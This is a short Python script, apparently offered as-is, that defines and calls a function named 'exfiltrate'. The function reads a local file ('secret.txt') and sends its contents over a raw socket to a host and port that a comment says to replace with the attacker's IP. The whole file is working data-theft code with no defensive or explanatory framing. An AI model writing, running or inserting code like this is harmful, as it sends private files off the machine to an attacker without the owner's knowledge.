import socket

def exfiltrate(file_path):
    s = socket.socket()
    s.connect(("127.0.0.1", 5555))  # Replace with attacker's IP/port
    with open(file_path, "rb") as f:
        s.send(f.read())
    s.close()

exfiltrate("secret.txt")
